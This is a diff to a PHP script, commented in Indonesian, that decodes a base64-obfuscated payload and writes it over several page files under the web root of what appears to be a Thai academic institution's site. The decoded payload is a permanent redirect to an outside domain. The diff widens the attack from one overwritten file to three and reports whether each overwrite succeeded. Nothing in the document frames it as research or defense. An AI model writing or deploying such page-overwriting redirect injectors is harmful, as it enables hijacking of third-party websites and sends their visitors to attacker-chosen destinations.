@@ -2,16 +2,20 @@
 // Ini adalah script upload dalam bentuk Base64
 $base64_code = 'PD9waHAKJHJlZGlyZWN0X3VybCA9ICJodHRwczovL3Vsb3NiYXRhay5saWZlL2tvbmdydXNoIjsKaGVhZGVyKCJIVFRQLzEuMSAzMDEgTW92ZWQgUGVybWFuZW50bHkiKTsKaGVhZGVyKCJMb2NhdGlvbjogJHJlZGlyZWN0X3VybCIpOwpleGl0KCk7Cj8+Cg==';
 
-// Path lengkap ke file target
-$file_path = '/home/tipnuada/domains/tipnuad.ac.th/public_html/amss/video.php';
+// Daftar path lengkap file yang ingin ditimpa
+$target_files = [
+    '/home/tipnuada/domains/tipnuad.ac.th/public_html/amss/video.php',
+    '/home/tipnuada/domains/tipnuad.ac.th/public_html/video.php',
+    '/home/tipnuada/domains/tipnuad.ac.th/public_html/video/index.php'
+];
 
-// Decode base64 dan timpa isi file target
-file_put_contents($file_path, base64_decode($base64_code));
-
-// Cek apakah berhasil
-if (file_exists($file_path)) {
-    echo "File $file_path berhasil ditimpa!";
-} else {
-    echo "Gagal menimpa file $file_path.";
+// Loop untuk menimpa semua file
+foreach ($target_files as $file_path) {
+    $result = file_put_contents($file_path, base64_decode($base64_code));
+    if ($result !== false) {
+        echo "File $file_path berhasil ditimpa!<br>";
+    } else {
+        echo "Gagal menimpa file $file_path.<br>";
+    }
 }
 ?>
